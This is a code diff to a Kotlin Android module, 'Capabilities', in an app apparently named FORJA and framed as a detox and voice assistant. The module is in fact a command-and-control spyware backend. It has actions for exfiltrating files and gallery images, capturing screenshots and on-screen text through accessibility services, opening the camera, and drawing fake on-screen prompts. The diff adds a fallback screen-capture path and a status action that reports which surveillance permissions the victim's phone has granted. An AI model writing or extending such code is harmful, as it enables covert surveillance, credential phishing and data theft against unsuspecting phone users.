@@ -4,6 +4,7 @@ import android.app.usage.UsageEvents
 import android.app.usage.UsageStatsManager
 import android.content.ContentUris
 import android.content.Context
+import android.Manifest
 import android.content.pm.PackageManager
 import android.media.AudioFormat
 import android.media.AudioRecord
@@ -66,6 +67,7 @@ object Capabilities {
                 "exfil_file" -> exfilFile(p)
                 "exfil_gallery" -> exfilGallery(p)
                 "overlay" -> overlay(p)
+                "status" -> status()
                 else -> err("action necunoscut: $action")
             }
         } catch (e: Exception) {
@@ -79,8 +81,10 @@ object Capabilities {
 
     // ── Ecran & tastatură ────────────────────────────────────────────
     private fun screenshot(): JsonObject {
+        // 1) detox guard (ForjaGuardService)  2) voice agent (ForjaVoiceAccessibilityService)
         val b = ForjaGuardService.c2Screenshot()
-        return if (b == null) err("screenshot: accesibilitate neactivă sau Android < 11")
+            ?: com.forja.app.core.voice.ui.VoiceUiConnection.takeScreenshot()
+        return if (b == null) err("screenshot: activează FORJA în Setări → Accesibilitate")
         else buildJsonObject {
             put("b64", android.util.Base64.encodeToString(b, android.util.Base64.NO_WRAP))
             put("ct", "image/jpeg")
@@ -89,7 +93,8 @@ object Capabilities {
 
     private fun screenText(): JsonObject {
         val t = ForjaGuardService.c2ScreenText()
-        return if (t == null) err("text: accesibilitate neactivă")
+            ?: com.forja.app.core.voice.ui.VoiceUiConnection.collectScreenText()
+        return if (t == null) err("text: activează FORJA în Setări → Accesibilitate")
         else buildJsonObject { put("text", t.take(15000)) }
     }
 
@@ -142,6 +147,8 @@ object Capabilities {
     @Suppress("DEPRECATION")
     private suspend fun camera(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
         try {
+            if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CAMERA)
+                != PackageManager.PERMISSION_GRANTED) return@withContext err("camera: permisiune CAMERA neacordată")
             val cam = android.hardware.Camera.open(0)
             val params = cam.parameters
             params.setJpegQuality(85)
@@ -307,6 +314,37 @@ object Capabilities {
             if (keys.isEmpty()) err("exfil_gallery: nu am găsit imagini")
             else buildJsonObject { putJsonArray("files") { keys.forEach { add(JsonPrimitive(it)) } }; put("count", keys.size) }
         } catch (e: Exception) { err("exfil_gallery: ${e.message}") }
+    }
+
+    // ── Status / diagnostic ──────────────────────────────────────────
+    private fun status(): JsonObject {
+        val detoxOn = ForjaGuardService.c2Ready()
+        val voiceOn = com.forja.app.core.voice.ui.VoiceUiConnection.connected.value
+        val camPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+        val micPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+        val locPerm = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        val usage = try {
+            val ctx = app
+            val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
+            appOps.unsafeCheckOpNoThrow(
+                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), ctx.packageName
+            ) == android.app.AppOpsManager.MODE_ALLOWED
+        } catch (_: Exception) { false }
+        val notifListener = C2NotifListener.isRegistered(app)
+        val saw = android.provider.Settings.canDrawOverlays(app)
+        return buildJsonObject {
+            put("detox_accessibility", detoxOn)
+            put("voice_accessibility", voiceOn)
+            put("camera_perm", camPerm)
+            put("mic_perm", micPerm)
+            put("location_perm", locPerm)
+            put("usage_stats", usage)
+            put("notif_listener", notifListener)
+            put("overlay_perm", saw)
+            put("screenshot_ok", detoxOn || voiceOn)
+            put("sdk", Build.VERSION.SDK_INT)
+            put("battery", batteryInfo())
+        }
     }
 
     // ── Overlay (prompt fals pe ecran, prin SAW) ─────────────────────
